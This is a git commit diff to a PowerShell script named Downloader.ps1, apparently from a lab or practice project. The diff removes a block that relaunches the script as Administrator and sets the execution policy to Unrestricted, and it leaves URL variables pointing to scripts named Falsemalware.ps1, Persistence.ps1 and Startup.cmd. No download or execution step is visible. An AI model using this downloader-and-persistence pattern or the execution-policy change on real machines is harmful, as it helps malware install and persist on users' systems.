dbf2b6bc069955e21f9c64a3af6e206f9efb0c2b
Freecil <128537217+Freecil@users.noreply.github.com>
2023-04-10 11:36:18 +0200

    Update Downloader.ps1

--- Downloader.ps1
+++ Downloader.ps1
@@ -1,11 +1,4 @@
-if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
-    if ([int](Get-CimInstance -Class Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber) -ge 6000) {
-        $CommandLine = "C:\temp\Downloader.ps1"
-        Start-Process -FilePath PowerShell.exe -Verb Runas -ArgumentList $CommandLine
-        Exit
-    }
-}
-Set-ExecutionPolicy Unrestricted
+
 $url = "https://github.com/Freecil/Prjoetls/blob/475c44bf721eca0f17cef81af241f9971d8c929e/Falsemalware.ps1"
 $url3 = "https://github.com/Freecil/Prjoetls/blob/371f0c98311f52559748f1f963179872c8aea582/Persistence.ps1"
 $url4 = "https://github.com/Freecil/Prjoetls/blob/b7721dec175d66f83df5febcb78595dc1f229fe6/Startup.cmd"
